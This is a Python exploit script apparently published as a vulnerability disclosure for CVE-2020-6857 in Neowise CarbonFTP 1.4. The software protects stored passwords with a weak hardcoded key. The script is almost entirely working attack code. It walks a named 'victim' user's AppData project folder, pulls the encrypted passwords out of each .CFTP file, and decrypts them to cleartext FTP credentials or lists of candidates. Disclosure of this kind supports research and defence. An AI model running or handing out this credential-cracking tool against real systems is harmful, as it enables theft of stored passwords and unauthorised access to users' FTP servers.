# Title: Neowise CarbonFTP 1.4 - Insecure Proprietary Password Encryption
# Date: 2020-04-20
# Author: hyp3rlinx
# Vendor:
# CVE: CVE-2020-6857

import time, string, sys, argparse, os, codecs

#Fixed: updated for Python 3, the hex decode() function was not working in Python 3 version.
#This should be compatible for Python 2 and 3 versions now, tested successfully.
#Sample test password 
#LOOOOONGPASSWORD! = 219042273422734224782298223744247862350210947 

key="97F"  #2431 in decimal, the weak hardcoded encryption key within the vuln program.
chunk_sz=5 #number of bytes we must decrypt the password by.

#Password is stored here:
#C:\Users\<VICTIM>\AppData\Roaming\Neowise\CarbonFTPProjects\<FILE>.CFTP

#Neowise CarbonFTP v1.4
#Insecure Proprietary Password Encryption
#By John Page (aka hyp3rlinx)
#Apparition Security
#===================================================

def carbonftp_conf(conf_file):
    p=""
    pipe=-1
    passwd=""
    lst_of_passwds=[]
    try:
        for p in conf_file:
            idx = p.find("Password=STRING|")
            if idx != -1:
                pipe = p.find("|")
                if pipe != -1:
                    passwd = p[pipe + 2: -2]
                    print(" Password found: "+ passwd)
                    lst_of_passwds.append(passwd) 
    except Exception as e:
        print(str(e))
    return lst_of_passwds 
    

def reorder(lst):
    k=1
    j=0
    for n in range(len(lst)):
        k+=1
        j+=1
        try:
            tmp = lst[n+k]
            a = lst[n+j]
            lst[n+j] = tmp
            lst[n+k] = a
        except Exception as e:
            pass
    return ''.join(lst)


def dec2hex(dec):
    tmp = str(hex(int(dec)))
    return str(tmp[2:])
 

#Updated for Python version compatibility.
def hex2ascii(h):
    h=h.strip()
    passwd=""
    try:
        passwd = codecs.decode(h, "hex").decode("ascii")
    except Exception as e:
        print("[!] In hex2ascii(), not a valid hex string.")
        exit()
    return passwd


def chunk_passwd(passwd_lst):
    lst = []
    for passwd in passwd_lst:
        while passwd:
            lst.append(passwd[:chunk_sz])
            passwd = passwd[chunk_sz:]
    return lst


def strip_non_printable_char(str):
  return ''.join([x for x in str if ord(x) > 31 or ord(x)==9])

cnt = 0
passwd_str=""
def deob(c):
    
    global cnt, passwd_str

    tmp=""

    try:
        tmp = int(c) - int(key, 16)
        tmp = dec2hex(tmp)
    except Exception as e:
        print("[!] Not a valid CarbonFTP encrypted password.")
        exit()

    b=""
    a=""

     #Seems we can delete the second char as its most always junk.
    if cnt!=1:
        a = tmp[:2]
        cnt+=1
    else:
        b = tmp[:4]
        
    passwd_str += strip_non_printable_char(hex2ascii(a + b))
    hex_passwd_lst = list(passwd_str)
    return hex_passwd_lst


def no_unique_chars(lst):
    c=0
    k=1
    j=0
    for i in range(len(lst)):
        k+=1
        j+=1
        try:
            a = lst[i]
            b = lst[i+1]
            if a != b:
                c+=1
            elif c==0:
                print("[!] Possible one char password?: " +str(lst[0]))
                return lst[0]
        except Exception as e:
            pass
    return False


def decryptor(result_lst):

    global passwd_str, sz

    print(" Decrypting ... \n")
    for i in result_lst:
        print("[-] "+i)
        time.sleep(0.1)
        lst = deob(i)

    #Re-order chars to correct sequence using custom swap function (reorder).
    reordered_pass = reorder(lst)
    sz = len(reordered_pass)

    #Flag possible single char password.
    no_unique_chars(lst)
    
    print("[+] PASSWORD LENGTH: " + str(sz))
    if sz == 9:
        return (reordered_pass[:-1] + " | " + reordered_pass[:-2] + " | " + reordered_pass[:-3] + " | " + reordered_pass[:-4] + " | " +
                reordered_pass[:-5] +" | " + reordered_pass[:-6] + " | "+ reordered_pass[:-7] + " | " + reordered_pass)
    
    #Shorter passwords less then nine chars will have several candidates
    #as they get padded with repeating chars so we return those.
        
    passwd_str=""
    return reordered_pass


def display_cracked_passwd(sz, passwd):
    if sz==9:
        print("[*] PASSWORD CANDIDATES: "+ passwd + "\n")
    else:
        print("[*] DECRYPTED PASSWORD: "+passwd + "\n")


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--user", help="Username to crack a directory of Carbon .CFTP password files")
    parser.add_argument("-p", "--encrypted_password", help="Crack a single encrypted password")
    return parser.parse_args()


def main(args):

    global passwd_str, sz
    victim=""

    if args.user and args.encrypted_password:
        print("[!] Supply a victims username -u or single encrypted password -p, not both.")
        exit()

    print("[+] Neowise CarbonFTP v1.4")
    time.sleep(0.1)
    print("[+] CVE-2020-6857 Insecure Proprietary Password Encryption")
    time.sleep(0.1)
    print("[+] Version 2 Exploit fixed for Python 3 compatibility")
    time.sleep(0.1)
    print("[+] Discovered and cracked by hyp3rlinx")
    time.sleep(0.1)
    print("[+] ApparitionSec\n")
    time.sleep(1)

    #Crack a dir of carbonFTP conf files containing encrypted passwords -u flag.
    if args.user:
        victim = args.user
        os.chdir("C:/Users/"+victim+"/AppData/Roaming/Neowise/CarbonFTPProjects/")
        dir_lst = os.listdir(".")
        for c in dir_lst:
            f=open("C:/Users/"+victim+"/AppData/Roaming/Neowise/CarbonFTPProjects/"+c, "r")
            #Get encrypted password from conf file
            passwd_enc = carbonftp_conf(f)
            #Break up into 5 byte chunks as processed by the proprietary decryption routine.
            result_lst = chunk_passwd(passwd_enc)
            #Decrypt the 5 byte chunks and reassemble to the cleartext password.
            cracked_passwd = decryptor(result_lst)
            #Print cracked password or candidates.
            display_cracked_passwd(sz, cracked_passwd)
            time.sleep(0.3)
            passwd_str=""
            f.close()


    #Crack a single password -p flag.
    if args.encrypted_password:
        passwd_to_crack_lst = []
        passwd_to_crack_lst.append(args.encrypted_password)
        result = chunk_passwd(passwd_to_crack_lst)
        #Print cracked password or candidates.
        cracked_passwd = decryptor(result)
        display_cracked_passwd(sz, cracked_passwd)


if __name__=="__main__":

    parser = argparse.ArgumentParser()

    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        exit()

    main(parse_args())
            
